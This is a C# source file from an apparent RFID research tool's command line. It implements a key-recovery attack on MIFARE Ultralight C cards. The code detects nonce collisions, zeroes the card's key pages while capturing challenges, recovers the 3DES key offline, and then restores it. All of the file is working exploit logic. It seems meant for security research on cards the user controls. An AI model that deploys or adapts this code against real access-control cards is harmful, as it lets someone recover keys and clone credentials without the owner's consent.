using System.Text.Json;
using ChameLab.Services;

namespace ChameLab.Cli;

public sealed partial class CliSession
{
    private async Task UlcgAsync(CliArguments a, CancellationToken ct)
    {
        var threads = Range(a.Int("threads"), 1, 256, "threads");
        Dictionary<string, string> challenges;
        if (a.Flag("offline"))
        {
            if (!a.Has("json")) throw new ArgumentException("--offline requires --json FILE.");
            challenges = JsonSerializer.Deserialize<Dictionary<string, string>>(await File.ReadAllTextAsync(a.Text("json"), ct))
                ?? throw new InvalidDataException("Invalid challenge file.");
        }
        else
        {
            var tag = (await Client.Hf14aScanAsync(ct)).Single();
            if (tag.Sak != 0) throw new InvalidOperationException("The tag is not Ultralight C.");
            var config = await RawHf([0x30, 40], ct);
            if (config.Length < 16 || config[8] < 48 || (config[1] & 128) != 0)
                throw new InvalidOperationException("The card key pages must be unlocked (AUTH0 >= 48, key lock bit clear).");
            challenges = new(); var seen = new HashSet<string>();
            var maximum = Range(a.Int("challenges"), 2, 1000000, "challenges");
            for (var n = 0; n < maximum; n++)
            {
                var nonce = await UlcNonce(ct);
                if (!seen.Add(nonce)) { challenges["challenge_100"] = nonce; break; }
            }
            if (!challenges.ContainsKey("challenge_100")) throw new InvalidOperationException("No nonce collision found; vulnerability was not established.");
            var file = a.Get("json") ?? $"ulcg-{tag.UidHex}-{DateTime.UtcNow:yyyyMMdd-HHmmss}.json";
            Print($"Collecting challenges clears the four key pages. Recovery data is saved to {file} after each stage.");
            await SaveChallenges(file, challenges);
            foreach (var (page, remaining) in new[] { (47, 75), (46, 50), (45, 25), (44, 0) })
            {
                var current = (await Client.Hf14aScanAsync(ct)).Single();
                if (!current.Uid.AsSpan().SequenceEqual(tag.Uid)) throw new InvalidOperationException("Card changed during acquisition.");
                await WriteUlcKeyPage(page, new byte[4], ct);
                challenges["challenge_" + remaining] = await UlcNonce(ct);
                await SaveChallenges(file, challenges);
            }
            if (a.Has("json")) { Print("Challenges saved. The card key is now zero; recover it with --offline --json."); return; }
        }
        var recovered = await UlcgRecovery.RecoverAsync(challenges, threads, new DirectProgress<string>(Print), ct);
        Print("Recovered key (DES parity bits zero): " + Convert.ToHexString(recovered));
        if (!a.Flag("offline"))
        {
            var swapped = recovered[..8].Reverse().Concat(recovered[8..].Reverse()).ToArray();
            for (var i = 0; i < 4; i++) await WriteUlcKeyPage(44 + i, swapped[(i * 4)..(i * 4 + 4)], ct);
            await Wire(2018, recovered, ct); Print("Key restored and authentication verified.");
        }
    }
    private static async Task SaveChallenges(string file, Dictionary<string, string> challenges)
    {
        var temp = file + ".tmp";
        await File.WriteAllTextAsync(temp, JsonSerializer.Serialize(challenges, new JsonSerializerOptions { WriteIndented = true }));
        File.Move(temp, file, overwrite: true);
    }
    private async Task<string> UlcNonce(CancellationToken ct)
    {
        var r = await RawHf([0x1A, 0], ct);
        if (r.Length != 9 || r[0] != 0xAF) throw new InvalidDataException("Invalid Ultralight C nonce response.");
        return Convert.ToHexString(r[1..]);
    }
    private async Task WriteUlcKeyPage(int page, byte[] data, CancellationToken ct)
    {
        var result = await UltralightRaw([0xA2, B(page), .. data], null, ct, checkCrc: false);
        if (result.Length != 1 || result[0] != 0x0A) throw new IOException($"Key page {page} write failed.");
    }
}
